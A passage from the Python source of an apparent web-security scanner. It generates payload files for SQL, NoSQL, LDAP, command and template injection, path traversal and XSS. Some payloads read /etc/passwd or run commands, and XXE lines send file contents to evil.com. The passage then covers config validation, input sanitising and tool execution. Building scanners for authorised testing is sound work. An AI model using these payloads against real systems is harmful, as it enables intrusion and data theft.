            "' AND (SELECT SUBSTRING(@@version,1,1))='8'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>100--",
            "' AND (SELECT LENGTH(database()))>5--",
            "' AND (SELECT LENGTH(user()))>4--",
            "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>96--",
            "' AND (SELECT ASCII(SUBSTRING(user(),1,1)))>96--",
            # Time-based blind SQLi
            "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
            "'; IF((SELECT COUNT(*) FROM information_schema.tables)>100) WAITFOR DELAY '0:0:5'--",
            "' AND IF((SELECT LENGTH(database()))>5,SLEEP(5),0)--",
            "' AND IF((SELECT LENGTH(user()))>4,SLEEP(5),0)--",
            "' AND IF((SELECT ASCII(SUBSTRING(database(),1,1)))>96,SLEEP(5),0)--",
            # Error-based SQLi
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
            # UNION-based SQLi with various column counts
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "' UNION SELECT @@version,database(),user(),4,5,6,7,8,9,10--",
            # NoSQL injection
            "' || '1'=='1",
            "' || 1==1//",
            "'; return true; //",
            "'; return 1==1; //",
            "' && this.password.match(/.*/)//",
            "' && this.password.match(/^a/)//",
            "' && this.password.match(/^admin/)//",
            "' || 1==1%00",
            "admin' || 'a'=='a",
            "admin' || true//",
            # LDAP injection
            "*)(&(objectClass=*)",
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*)(|(cn=*))",
            "admin)(&(password=*))",
            # XPath injection
            "' or '1'='1",
            "' or 1=1 or 'a'='a",
            "' or count(/)>0 or 'a'='a",
            "' or name()='username' or 'a'='a",
            "' or position()=1 or 'a'='a",
            # OS command injection
            "'; ls -la; echo 'done",
            "'; cat /etc/passwd; echo 'done",
            "'; whoami; echo 'done",
            "'; id; echo 'done",
            "'; uname -a; echo 'done",
            "| ls -la",
            "| cat /etc/passwd",
            "| whoami",
            "| id",
            "| uname -a",
            "$(ls -la)",
            "$(cat /etc/passwd)",
            "$(whoami)",
            "$(id)",
            "$(uname -a)",
            "`ls -la`",
            "`cat /etc/passwd`",
            "`whoami`",
            "`id`",
            "`uname -a`",
            # Template injection
            "{{7*7}}",
            "{{7*'7'}}",
            "${7*7}",
            "#{7*7}",
            "*{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "{{request}}",
            "{{self}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            # Server-side template injection (SSTI)
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
            "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
            # File inclusion
            "../../../../../../etc/passwd",
            "../../../../../../etc/shadow",
            "../../../../../../etc/hosts",
            "../../../../../../windows/system32/drivers/etc/hosts",
            "../../../../../../windows/win.ini",
            "../../../../../../windows/system.ini",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///windows/win.ini",
            # XXE injection
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://evil.com/evil.dtd'>%remote;]><root></root>",
            "<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfiltrate SYSTEM \"http://evil.com/?x=%file;\">'>%eval;%exfiltrate;]><root></root>",
            # Expression language injection
            "${1+1}",
            "#{1+1}",
            "${7*7}",
            "#{7*7}",
            "${T(java.lang.System).getProperty('user.name')}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            # Deserialization attacks
            "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
            "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdAAEcHduZA==",
            # Format string attacks
            "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
            "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
            "%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
            "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
            # Buffer overflow patterns
            "A" * 100,
            "A" * 256,
            "A" * 512,
            "A" * 1024,
            "A" * 2048,
            "A" * 4096,
            # Encoded payloads
            "%27%20OR%20%271%27%3D%271",
            "%22%20OR%20%221%22%3D%221",
            "%60%20OR%20%601%60%3D%601",
            "%27%20UNION%20SELECT%20NULL--",
            "%22%20UNION%20SELECT%20NULL--",
            "%60%20UNION%20SELECT%20NULL--",
            # Double encoded
            "%2527%2520OR%25201%253D1--",
            "%2522%2520OR%25201%253D1--",
            "%2560%2520OR%25201%253D1--",
            # Unicode encoded
            "\\u0027\\u0020OR\\u0020\\u0031\\u003D\\u0031",
            "\\u0022\\u0020OR\\u0020\\u0031\\u003D\\u0031",
            "\\u0060\\u0020OR\\u0020\\u0031\\u003D\\u0031",
        ]
        write_lines(advanced_sqli_file, advanced_sqli)
        logger.info(f"Created advanced SQL injection payloads: {advanced_sqli_file}")
    
    # Create comprehensive XSS payloads for different contexts
    advanced_xss_file = PAYLOADS_DIR / "advanced-xss-payloads.txt"
    if not advanced_xss_file.exists():
        advanced_xss = [
            # Polyglot XSS payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\">`><marquee><img src=x onerror=confirm(1)></marquee>\" onfocus=JaVaSCript:alert(1) autofocus",
            "<img src=x onerror=alert('XSS') onerror=alert('XSS') onerror=alert('XSS')>",
            # Context-specific XSS
            # HTML context
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            # Attribute context
            "' onmouseover='alert(1)",
            "\" onmouseover=\"alert(1)",
            "' autofocus onfocus='alert(1)",
            "\" autofocus onfocus=\"alert(1)",
            # JavaScript context
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "';alert(String.fromCharCode(88,83,83));//",
            "\";alert(String.fromCharCode(88,83,83));//",
            # CSS context
            "</style><script>alert('XSS')</script>",
            "expression(alert('XSS'))",
            "url(javascript:alert('XSS'))",
            "@import'javascript:alert(\"XSS\")'",
            # URL context
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            # Event handlers
            "onload=alert('XSS')",
            "onerror=alert('XSS')",
            "onmouseover=alert('XSS')",
            "onfocus=alert('XSS')",
            "onclick=alert('XSS')",
            "onsubmit=alert('XSS')",
            "onchange=alert('XSS')",
            "onkeydown=alert('XSS')",
            "onkeyup=alert('XSS')",
            "onkeypress=alert('XSS')",
            # WAF bypass techniques
            "<scr<script>ipt>alert('XSS')</script>",
            "<scrİpt>alert('XSS')</scrİpt>",
            "<script>alert('XSS')</script>",
            "<ſcript>alert('XSS')</ſcript>",
            "<script>al\\u0065rt('XSS')</script>",
            "<script>al\\x65rt('XSS')</script>",
            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>window['ale'+'rt']('XSS')</script>",
            "<script>window[/ale/.source+/rt/.source]('XSS')</script>",
            "<script>Function('ale'+'rt(1)')();rlert('XSS')</script>",
            "<script>[].constructor.constructor('alert(1)')();</script>",
            "<script>top[8680439..toString(30)](1)</script>",
            "<script>(alert)(1)</script>",
            "<script>a=alert,a(1)</script>",
            "<script>[alert][0](1)</script>",
            "<script>alert.call(null,1)</script>",
            "<script>alert.apply(null,[1])</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',0)</script>",
            "<script>requestAnimationFrame(alert.bind(null,1))</script>",
            "<script>Promise.resolve().then(function(){alert(1)})</script>",
            "<script>throw onerror=alert,1</script>",
            "<script>with(document)write('<img src=1 onerror=alert(1)>')</script>",
            # HTML5 vectors
            "<audio src=x onerror=alert(1)>",
            "<video><source onerror=\"alert(1)\">",
            "<input type=image src=x onerror=alert(1)>",
            "<isindex action=javascript:alert(1) type=image>",
            "<object data=\"javascript:alert(1)\">",
            "<embed src=\"javascript:alert(1)\">",
            "<applet code=\"javascript:alert(1)\">",
            "<form><button formaction=javascript&colon;alert(1)>CLICKME",
            "<form><input formaction=javascript&colon;alert(1) type=submit value=CLICKME>",
            "<form><textarea formaction=javascript&colon;alert(1)>CLICKME",
            "<form><select formaction=javascript&colon;alert(1)><option>CLICKME",
            "<form><keygen formaction=javascript&colon;alert(1)>",
            "<frameset onload=alert(1)>",
            # SVG vectors
            "<svg/onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><script href=data:,alert(1) />",
            "<svg><script xlink:href=data:,alert(1) />",
            "<svg><use xlink:href=data:,<svg id='x' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><script>alert(1)</script></svg>#x />",
            "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
            "<svg><title><script>alert(1)</script></title></svg>",
            "<svg><desc><script>alert(1)</script></desc></svg>",
            "<svg><metadata><script>alert(1)</script></metadata></svg>",
            "<svg><text><script>alert(1)</script></text></svg>",
            "<svg><textPath><script>alert(1)</script></textPath></svg>",
            "<svg><tspan><script>alert(1)</script></tspan></svg>",
            "<svg><defs><script>alert(1)</script></defs></svg>",
            "<svg><g><script>alert(1)</script></g></svg>",
            "<svg><symbol><script>alert(1)</script></symbol></svg>",
            "<svg><marker><script>alert(1)</script></marker></svg>",
            "<svg><clipPath><script>alert(1)</script></clipPath></svg>",
            "<svg><mask><script>alert(1)</script></mask></svg>",
            "<svg><pattern><script>alert(1)</script></pattern></svg>",
            "<svg><image><script>alert(1)</script></image></svg>",
            "<svg><switch><script>alert(1)</script></switch></svg>",
            "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>",
            # MathML vectors
            "<math><script>alert(1)</script></math>",
            "<math><mtext><script>alert(1)</script></mtext></math>",
            "<math><mi><script>alert(1)</script></mi></math>",
            "<math><mo><script>alert(1)</script></mo></math>",
            "<math><mn><script>alert(1)</script></mn></math>",
            "<math><ms><script>alert(1)</script></ms></math>",
            "<math><mspace><script>alert(1)</script></mspace></math>",
            "<math><mrow><script>alert(1)</script></mrow></math>",
            "<math><mfrac><script>alert(1)</script></mfrac></math>",
            "<math><msqrt><script>alert(1)</script></msqrt></math>",
            "<math><mroot><script>alert(1)</script></mroot></math>",
            "<math><mstyle><script>alert(1)</script></mstyle></math>",
            "<math><merror><script>alert(1)</script></merror></math>",
            "<math><mpadded><script>alert(1)</script></mpadded></math>",
            "<math><mphantom><script>alert(1)</script></mphantom></math>",
            "<math><menclose><script>alert(1)</script></menclose></math>",
            "<math><msub><script>alert(1)</script></msub></math>",
            "<math><msup><script>alert(1)</script></msup></math>",
            "<math><msubsup><script>alert(1)</script></msubsup></math>",
            "<math><munder><script>alert(1)</script></munder></math>",
            "<math><mover><script>alert(1)</script></mover></math>",
            "<math><munderover><script>alert(1)</script></munderover></math>",
            "<math><mmultiscripts><script>alert(1)</script></mmultiscripts></math>",
            "<math><mtable><script>alert(1)</script></mtable></math>",
            "<math><mtr><script>alert(1)</script></mtr></math>",
            "<math><mtd><script>alert(1)</script></mtd></math>",
            "<math><maligngroup><script>alert(1)</script></maligngroup></math>",
            "<math><malignmark><script>alert(1)</script></malignmark></math>",
            "<math><maction><script>alert(1)</script></maction></math>",
            # Template literals and ES6
            "<script>`${alert(1)}`</script>",
            "<script>alert`1`</script>",
            "<script>eval`alert\\x281\\x29`</script>",
            "<script>setTimeout`alert\\x281\\x29`</script>",
            "<script>setInterval`alert\\x281\\x29`</script>",
            "<script>Function`x${alert(1)}x`</script>",
            "<script>new Function`x${alert(1)}x`</script>",
            "<script>(alert)`1`</script>",
            "<script>(alert).call`${{toString:alert,valueOf:()=>1}}`</script>",
            # RegExp and other creative vectors
            "<script>alert(RegExp.prototype.test.call(/a/,alert(1)))</script>",
            "<script>Array.prototype.toString.call([alert,1])</script>",
            "<script>String.prototype.replace.call('x',/x/,alert)</script>",
            "<script>Function.prototype.call.call(alert,null,1)</script>",
            "<script>Reflect.apply(alert,null,[1])</script>",
            "<script>Reflect.construct(alert,[1])</script>",
            # WebAssembly
            "<script>fetch('data:application/wasm;base64,AGFzbQEAAAA=').then(r=>r.arrayBuffer()).then(b=>WebAssembly.instantiate(b)).then(m=>alert(1))</script>",
            # Service Worker
            "<script>navigator.serviceWorker.register('data:text/javascript,alert(1)')</script>",
            # Import maps
            "<script type=\"importmap\">{\"imports\":{\"alert\":\"data:text/javascript,alert(1)\"}}</script><script type=\"module\">import\"alert\"</script>",
            # CSS injection
            "<style>@import'javascript:alert(1)'</style>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
            "<style>body{-webkit-binding:url('javascript:alert(1)')}</style>",
            "<style>body{behavior:url('javascript:alert(1)')}</style>",
            "<link rel=stylesheet href='javascript:alert(1)'>",
            # Meta refresh
            "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
            "<meta http-equiv=refresh content=0;url=data:text/html,<script>alert(1)</script>>",
            # Base href
            "<base href='javascript:alert(1)//'><a href=x>click</a>",
            "<base href='data:text/html,<script>alert(1)</script>'><iframe src=x>",
            # Form action
            "<form action='javascript:alert(1)'><input type=submit></form>",
            "<form><button formaction='javascript:alert(1)'>click</button></form>",
            # Mixed content
            "<div onclick='&#97;lert(1)'>click</div>",
            "<div onclick='\\u0061lert(1)'>click</div>",
            "<div onclick='eval(\"\\x61lert(1)\")'>click</div>",
            "<div onclick='Function(\"\\x61lert(1)\")()'>click</div>",
        ]
        write_lines(advanced_xss_file, advanced_xss)
        logger.info(f"Created advanced XSS payloads: {advanced_xss_file}")
    
    logger.info("Enhanced wordlists and payloads creation complete.")

def create_targets_file():
    """Create a default targets.txt file if it doesn't exist."""
    if not TARGETS_FILE.exists():
        try:
            TARGETS_FILE.write_text("# Add your targets here, one per line\n# example.com\n# test.example.org\n")
            logger.info(f"Created default targets file: {TARGETS_FILE}")
        except Exception as e:
            logger.error(f"Failed to create targets file: {e}")

def initialize_environment():
    """Perform all setup tasks: directories, wordlists, targets, dependencies."""
    logger.info("=== Initializing Moloch Environment ===")
    create_directories()
    create_default_wordlists() # Now just ensures dirs exist
    create_targets_file()
    config = load_config()
    check_and_install_dependencies(config)
    logger.info("=== Moloch Environment Initialization Complete ===")

# --- Configuration Management ---
def load_config() -> Dict[str, Any]:
    """Load configuration from file or create default."""
    if CFG_FILE.exists():
        try:
            with open(CFG_FILE, 'r') as f:
                loaded_config = json.load(f)
                # Merge with default to ensure all keys are present
                merged_config = DEFAULT_CONFIG.copy()
                for key, value in loaded_config.items():
                    if isinstance(value, dict) and key in merged_config and isinstance(merged_config[key], dict):
                        merged_config[key].update(value)
                    else:
                        merged_config[key] = value
                
                # Validate and apply security defaults
                is_valid, errors = validate_config(merged_config)
                if not is_valid:
                    logger.warning(f"Configuration validation errors: {'; '.join(errors)}")
                    logger.info("Applying security defaults to fix configuration issues")
                
                merged_config = apply_security_defaults(merged_config)
                
                # Save corrected configuration
                if not is_valid:
                    save_config(merged_config)
                    logger.info("Configuration auto-corrected and saved")
                
                return merged_config
        except Exception as e:
            logger.error(f"Error loading config: {e}. Using defaults.")
    # Create default config if not found or error
    default_config = apply_security_defaults(DEFAULT_CONFIG.copy())
    save_config(default_config)
    return default_config

def save_config(config: Dict[str, Any]):
    """Save configuration to file."""
    try:
        with open(CFG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        logger.info("Configuration saved.")
    except Exception as e:
        logger.error(f"Error saving config: {e}")

def validate_config(config: Dict[str, Any]) -> Tuple[bool, List[str]]:
    """Validate configuration structure and values."""
    errors = []
    
    # Check required top-level keys
    required_keys = ['tools', 'wordlists', 'output', 'performance', 'modules']
    for key in required_keys:
        if key not in config:
            errors.append(f"Missing required configuration section: {key}")
    
    # Validate tools configuration
    if 'tools' in config:
        for tool_name, tool_config in config['tools'].items():
            if not isinstance(tool_config, dict):
                errors.append(f"Tool configuration for {tool_name} must be a dictionary")
                continue
            
            # Check for enabled field
            if 'enabled' not in tool_config:
                errors.append(f"Tool {tool_name} missing 'enabled' field")
    
    # Validate performance settings
    if 'performance' in config:
        perf = config['performance']
        if 'max_workers' in perf:
            try:
                max_workers = int(perf['max_workers'])
                if max_workers < 1 or max_workers > 50:
                    errors.append("max_workers must be between 1 and 50")
            except (ValueError, TypeError):
                errors.append("max_workers must be a valid integer")
        
        if 'tool_timeout' in perf:
            try:
                timeout = int(perf['tool_timeout'])
                if timeout < 30 or timeout > 3600:
                    errors.append("tool_timeout must be between 30 and 3600 seconds")
            except (ValueError, TypeError):
                errors.append("tool_timeout must be a valid integer")
    
    # Validate output settings
    if 'output' in config:
        output = config['output']
        if 'report_format' in output:
            valid_formats = ['html', 'json', 'markdown', 'xml']
            if output['report_format'] not in valid_formats:
                errors.append(f"report_format must be one of: {', '.join(valid_formats)}")
    
    return len(errors) == 0, errors

def apply_security_defaults(config: Dict[str, Any]) -> Dict[str, Any]:
    """Apply security-focused default configurations."""
    # Ensure conservative timeouts
    if 'performance' not in config:
        config['performance'] = {}
    
    performance = config['performance']
    
    # Set conservative defaults
    if 'max_workers' not in performance or performance['max_workers'] > 20:
        performance['max_workers'] = 10
        logger.info("Applied conservative max_workers limit: 10")
    
    if 'tool_timeout' not in performance or performance['tool_timeout'] > 1800:
        performance['tool_timeout'] = 600
        logger.info("Applied conservative tool timeout: 600 seconds")
    
    # Ensure rate limiting is enabled
    if 'rate_limit' not in performance:
        performance['rate_limit'] = 1000
        logger.info("Applied default rate limit: 1000")
    
    # Ensure secure output settings
    if 'output' not in config:
        config['output'] = {}
    
    output = config['output']
    if 'auto_open_html' not in output:
        output['auto_open_html'] = False  # More secure default
        logger.info("Disabled auto-open HTML for security")
    
    return config

# --- Utility Functions ---
def sanitize_filename(name: str) -> str:
    """Sanitize string for use as a filename."""
    return re.sub(r'[<>:"/\\|?*\x00-\x1F]', '_', name)

def validate_target(target: str) -> Tuple[bool, str]:
    """Validate a target string for security and format."""
    if not target or not isinstance(target, str):
        return False, "Target must be a non-empty string"
    
    target = target.strip()
    
    # Check for malicious characters
    malicious_chars = ['&', '|', ';', '`', '$', '(', ')', '{', '}', '[', ']', '<', '>']
    if any(char in target for char in malicious_chars):
        return False, "Target contains potentially dangerous characters"
    
    # Check for basic IP address pattern
    ip_pattern = re.compile(r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(?:/[0-9]{1,2})?$')
    
    # Check for basic domain pattern
    domain_pattern = re.compile(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$')
    
    # Check for URL pattern
    url_pattern = re.compile(r'^https?://[^\s/$.?#].[^\s]*$', re.IGNORECASE)
    
    if ip_pattern.match(target) or domain_pattern.match(target) or url_pattern.match(target):
        return True, "Valid target format"
    
    return False, "Invalid target format (must be IP, domain, or URL)"

def validate_port(port: str) -> Tuple[bool, str]:
    """Validate a port number."""
    try:
        port_num = int(port)
        if 1 <= port_num <= 65535:
            return True, "Valid port"
        else:
            return False, "Port must be between 1 and 65535"
    except ValueError:
        return False, "Port must be a valid number"

def sanitize_input(user_input: str, max_length: int = 1000) -> str:
    """Sanitize user input for security."""
    if not user_input:
        return ""
    
    # Limit length
    sanitized = user_input[:max_length]
    
    # Remove or escape dangerous characters
    sanitized = re.sub(r'[&|;`$(){}[\]<>]', '', sanitized)
    
    # Remove null bytes and control characters
    sanitized = re.sub(r'[\x00-\x1F\x7F]', '', sanitized)
    
    return sanitized.strip()

def validate_file_path(file_path: str, allowed_extensions: Optional[List[str]] = None) -> Tuple[bool, str]:
    """Validate a file path for security."""
    if not file_path:
        return False, "File path cannot be empty"
    
    # Check for path traversal attempts
    if '..' in file_path or file_path.startswith('/'):
        return False, "Path traversal detected"
    
    # Check for absolute paths on Windows
    if len(file_path) > 1 and file_path[1] == ':':
        return False, "Absolute paths not allowed"
    
    # Check file extension if specified
    if allowed_extensions:
        file_ext = Path(file_path).suffix.lower()
        if file_ext not in allowed_extensions:
            return False, f"File extension must be one of: {', '.join(allowed_extensions)}"
    
    return True, "Valid file path"

def new_run() -> Path:
    """Create a new run directory."""
    run_id = f"{APP.lower()}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
    run_dir = RUNS_DIR / run_id
    run_dir.mkdir(parents=True, exist_ok=True)
    (run_dir / "subdomains").mkdir(exist_ok=True)
    (run_dir / "hosts").mkdir(exist_ok=True)
    (run_dir / "vulns").mkdir(exist_ok=True)
    (run_dir / "fuzzing").mkdir(exist_ok=True)
    (run_dir / "crawling").mkdir(exist_ok=True)
    (run_dir / "report").mkdir(exist_ok=True)
    logger.info(f"New run directory created: {run_dir}")
    return run_dir

def read_lines(file_path: Path) -> List[str]:
    """Read lines from a file."""
    if not file_path.exists():
        return []
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logger.error(f"Error reading {file_path}: {e}")
        return []

def write_lines(file_path: Path, lines: List[str]):
    """Write lines to a file."""
    try:
        # Ensure parent directory exists
        file_path.parent.mkdir(parents=True, exist_ok=True)
        with open(file_path, 'w') as f:
            for line in lines:
                f.write(f"{line}\n")
    except Exception as e:
        logger.error(f"Error writing to {file_path}: {e}")

def safe_execute(func, *args, default=None, error_msg="Operation failed", **kwargs):
    """Safely execute a function with error handling."""
    try:
        return func(*args, **kwargs)
    except Exception as e:
        logger.error(f"{error_msg}: {e}")
        return default

# --- HTTP Client with Connection Pooling ---
class SecureHTTPClient:
    """Secure HTTP client with connection pooling and rate limiting."""
    
    def __init__(self, max_connections: int = 20, timeout: int = 30, rate_limit: int = 10):
        self.max_connections = max_connections
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.session = None
        self._rate_limiter = asyncio.Semaphore(rate_limit)
    
    async def __aenter__(self):
        """Async context manager entry."""
        # Create SSL context with security settings
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = True
        ssl_context.verify_mode = ssl.CERT_REQUIRED
        
        # Create connector with connection pooling
        connector = aiohttp.TCPConnector(
            limit=self.max_connections,
            limit_per_host=5,
            ssl=ssl_context,
            enable_cleanup_closed=True,
            keepalive_timeout=60
        )
        
        # Create session with timeout
        timeout_config = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout_config,
            headers={
                'User-Agent': f'Azaz-El-Security-Scanner/{VERSION}',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
    
    async def get(self, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make a rate-limited GET request."""
        async with self._rate_limiter:
            try:
                async with self.session.get(url, **kwargs) as response:
                    return response
            except asyncio.TimeoutError:
                logger.warning(f"Request timeout for URL: {url}")
                return None
            except aiohttp.ClientError as e:
                logger.warning(f"HTTP client error for URL {url}: {e}")
                return None
            except Exception as e:
                logger.error(f"Unexpected error for URL {url}: {e}")
                return None
    
    async def head(self, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make a rate-limited HEAD request."""
        async with self._rate_limiter:
            try:
                async with self.session.head(url, **kwargs) as response:
                    return response
            except asyncio.TimeoutError:
                logger.warning(f"HEAD request timeout for URL: {url}")
                return None
            except aiohttp.ClientError as e:
                logger.warning(f"HEAD request error for URL {url}: {e}")
                return None
            except Exception as e:
                logger.error(f"Unexpected HEAD error for URL {url}: {e}")
                return None

async def check_urls_async(urls: List[str], max_concurrent: int = 10) -> Dict[str, Dict[str, Any]]:
    """Asynchronously check multiple URLs for availability and basic info."""
    results = {}
    
    async with SecureHTTPClient(max_connections=max_concurrent) as client:
        semaphore = asyncio.Semaphore(max_concurrent)
        
        async def check_single_url(url: str) -> Tuple[str, Dict[str, Any]]:
            async with semaphore:
                try:
                    response = await client.head(url)
                    if response:
                        return url, {
                            'status': response.status,
                            'accessible': response.status < 400,
                            'headers': dict(response.headers),
                            'content_type': response.headers.get('content-type', ''),
                            'server': response.headers.get('server', ''),
                            'error': None
                        }
                    else:
                        return url, {
                            'status': None,
                            'accessible': False,
                            'error': 'Request failed'
                        }
                except Exception as e:
                    return url, {
                        'status': None,
                        'accessible': False,
                        'error': str(e)
                    }
        
        # Execute all URL checks concurrently
        tasks = [check_single_url(url) for url in urls]
        results_list = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results_list:
            if isinstance(result, tuple):
                url, data = result
                results[url] = data
            else:
                logger.error(f"Error in URL check: {result}")
    
    return results

# --- Core Tool Execution Logic ---
def execute_tool_with_retry(tool_name: str, args: List[str], output_file: Optional[Path] = None, 
                          run_dir: Optional[Path] = None, env: Optional[Dict[str, str]] = None,
                          max_retries: int = 3, retry_delay: int = 5) -> bool:
    """Execute a security tool with retry mechanism and enhanced error handling."""
    config = load_config()
    tools_config = config.get("tools", {})
    tool_config = tools_config.get(tool_name, {})
    
    if not tool_config.get("enabled", True):
        logger.warning(f"Tool {tool_name} is disabled in configuration")
        return False
    
    if not which(tool_name):
        logger.warning(f"Tool {tool_name} not found in PATH")
        
        # Check if tool installation should be attempted
        allow_install = config.get("security", {}).get("allow_auto_install", False)
        
        if allow_install and "install_cmd" in tool_config:
            logger.info(f"Attempting to install {tool_name}...")
            # Set a reasonable timeout for installation attempts  
            if install_tool_with_fallback(tool_name, config):
                logger.info(f"Successfully installed {tool_name}")
                # Re-check if tool is now available
                if not which(tool_name):
                    logger.warning(f"Tool {tool_name} installed but still not found in PATH")
                    return False
            else:
                logger.warning(f"Failed to install {tool_name} - continuing without it")
                return False
        else:
            logger.info(f"Skipping {tool_name} - tool not available and auto-install disabled")
            return False

    # Construct command with enhanced flags
    base_flags = tool_config.get("flags", [])
    performance_config = config.get("performance", {})
    
    # Add performance optimizations based on tool
    enhanced_args = list(args)
    if tool_name in ["httpx", "nuclei", "subfinder"]:
        # Add rate limiting and threading
        rate_limit = performance_config.get("rate_limit", 1000)
        max_workers = performance_config.get("max_workers", 10)
        
        if "-rl" not in enhanced_args and tool_name in ["httpx", "nuclei"]:
            enhanced_args.extend(["-rl", str(rate_limit)])
        if "-c" not in enhanced_args and tool_name == "nuclei":
            enhanced_args.extend(["-c", str(max_workers)])
        if "-t" not in enhanced_args and tool_name == "httpx":
            enhanced_args.extend(["-t", str(max_workers)])
    
    cmd = [tool_name] + base_flags + enhanced_args
    
    # Special handling for tools requiring specific setups
    tool_env = os.environ.copy()
    if env:
        tool_env.update(env)

    if tool_name == "chaos" and config.get("auth", {}).get("chaos_api_key"):
        tool_env["CHAOS_KEY"] = config.get("auth", {}).get("chaos_api_key")
    elif tool_name == "nuclei" and config.get("auth", {}).get("nuclei_interactsh"):
        cmd.extend(["-interactsh-url", config.get("auth", {}).get("nuclei_interactsh")])
    elif tool_name == "dalfox" and "-b" in cmd:
        # Ensure a blind XSS server is configured or warn
        if "your.xss.hunter.domain" in cmd:
            logger.warning("Dalfox configured with default blind XSS domain. Please configure your own in moloch.cfg.json.")
    
    for attempt in range(max_retries):
        try:
            logger.info(f"Executing {tool_name} (attempt {attempt + 1}/{max_retries})")
            logger.debug(f"Command: {' '.join(cmd)}")
            
            start_time = time.time()
            timeout = performance_config.get("tool_timeout", 600)
            
            result = run_cmd(cmd, timeout=timeout, cwd=str(run_dir) if run_dir else None, env=tool_env)
            execution_time = time.time() - start_time
            
            if result.returncode == 0:
                logger.info(f"Tool {tool_name} completed successfully in {execution_time:.2f}s")
                
                if output_file and result.stdout:
                    # Ensure parent directory exists
